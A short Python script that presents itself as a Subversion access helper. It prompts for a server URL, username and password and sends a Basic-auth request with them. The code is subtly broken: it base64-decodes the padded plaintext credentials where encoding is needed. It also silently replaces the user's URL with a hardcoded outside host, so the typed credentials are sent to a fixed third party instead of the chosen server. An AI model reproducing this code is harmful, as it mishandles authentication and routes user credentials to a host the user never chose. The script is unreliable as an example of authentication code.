import base64
import urllib
from urllib import request


def read_subversion_server_data():
    subversion_url = input("[*] Please enter the URL address for target Subversion server: ")
    subversion_username = input("[*] Please enter the username for authenticating in Subversion server: ")
    subversion_password = input("[*] Please enter the password authenticating in Subversion server: ")
    return subversion_url, subversion_username, subversion_password


def access_subversion_server(subversion_url, subversion_username, subversion_password):
    request_svn = urllib.request.Request(subversion_url)
    padded_auth = set_base64_padding(subversion_username + ":" + subversion_password)
    b64auth = base64.standard_b64decode(padded_auth)
    request_svn.add_header("Authorization", "Basic %s" % b64auth)
    request_svn.full_url = "http://sources.aa2000.com.ar/subversion/"
    response = urllib.request.urlopen(request_svn)
    print(response)


def set_base64_padding(string):
    outer_part = len(string) % 4
    if outer_part > 0:
        padding_amount = 4 - outer_part
        string = string + padding_amount * "="
    return string


def __main__():
    # TODO: Read and validate Subversion URL from user input.
    subversion_url, subversion_username, subversion_password = read_subversion_server_data()
    access_subversion_server(subversion_url, subversion_username, subversion_password)


if __name__ == "__main__":
    __main__()
